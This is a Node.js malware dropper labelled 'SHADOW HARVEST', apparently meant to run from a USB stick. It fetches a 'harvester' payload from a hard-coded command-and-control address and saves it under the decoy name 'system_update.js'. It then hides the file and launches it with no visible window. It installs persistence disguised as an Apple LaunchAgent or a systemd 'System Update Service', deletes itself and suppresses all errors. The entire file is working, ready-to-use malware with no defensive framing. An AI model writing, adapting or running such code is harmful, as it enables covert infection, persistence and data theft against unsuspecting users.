#!/usr/bin/env node
// ============================================
// SHADOW HARVEST - Dropper
// USB Auto-Execution Payload
// Downloads and executes the main harvester silently
// ============================================

const fs = require("fs");
const os = require("os");
const path = require("path");
const https = require("https");
const http = require("http");
const { execSync } = require("child_process");

const CONFIG = {
  payloadUrl: "http://192.168.1.47:8080/payload/harvester.js",
  payloadName: "system_update.js",
  c2Server: "http://192.168.1.47:8080",
};

// Detect OS
const platform = os.platform();
const home = os.homedir();

// Download payload
function downloadPayload(url, destPath) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(destPath);
    http.get(url, (response) => {
      if (response.statusCode !== 200) {
        reject(new Error(`HTTP ${response.statusCode}`));
        return;
      }
      response.pipe(file);
      file.on("finish", () => {
        file.close();
        resolve(destPath);
      });
    }).on("error", (err) => {
      fs.unlinkSync(destPath);
      reject(err);
    });
  });
}

// Hide file
function hideFile(filePath) {
  if (platform === "win32") {
    try {
      execSync(`attrib +h +s "${filePath}"`, { windowsHide: true });
    } catch (e) {}
  } else {
    const dir = path.dirname(filePath);
    const base = path.basename(filePath);
    const hiddenPath = path.join(dir, `.${base}`);
    fs.renameSync(filePath, hiddenPath);
    return hiddenPath;
  }
  return filePath;
}

// Execute silently
function executePayload(filePath) {
  if (platform === "win32") {
    // Use VBScript to run without console window
    const vbsPath = path.join(os.tmpdir(), "run_silent.vbs");
    const vbsContent = `
      Set objShell = CreateObject("WScript.Shell")
      objShell.Run "node ${filePath}", 0, False
    `;
    fs.writeFileSync(vbsPath, vbsContent);
    execSync(`wscript "${vbsPath}"`, { windowsHide: true });
    fs.unlinkSync(vbsPath);
  } else if (platform === "darwin") {
    // Use launchctl for macOS
    const plistPath = path.join(home, "Library", "LaunchAgents", "com.apple.update.plist");
    const plistContent = `<?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
    <plist version="1.0">
    <dict>
      <key>Label</key>
      <string>com.apple.update</string>
      <key>ProgramArguments</key>
      <array>
        <string>/usr/local/bin/node</string>
        <string>${filePath}</string>
      </array>
      <key>RunAtLoad</key>
      <true/>
    </dict>
    </plist>`;
    fs.writeFileSync(plistPath, plistContent);
    execSync(`launchctl load "${plistPath}"`, { stdio: "ignore" });
  } else if (platform === "linux") {
    // Use systemd user service
    const serviceDir = path.join(home, ".config", "systemd", "user");
    fs.mkdirSync(serviceDir, { recursive: true });
    const servicePath = path.join(serviceDir, "system-update.service");
    const serviceContent = `[Unit]
    Description=System Update Service
    [Service]
    ExecStart=/usr/bin/node ${filePath}
    [Install]
    WantedBy=default.target`;
    fs.writeFileSync(servicePath, serviceContent);
    execSync(`systemctl --user enable system-update.service`, { stdio: "ignore" });
    execSync(`systemctl --user start system-update.service`, { stdio: "ignore" });
  }
}

// Main execution
(async () => {
  try {
    const tempDir = os.tmpdir();
    const payloadPath = path.join(tempDir, CONFIG.payloadName);
    await downloadPayload(CONFIG.payloadUrl, payloadPath);
    const hiddenPath = hideFile(payloadPath);
    executePayload(hiddenPath);

    // Self-destruct
    fs.unlinkSync(__filename);
  } catch (e) {
    // Silent fail
  }
})();
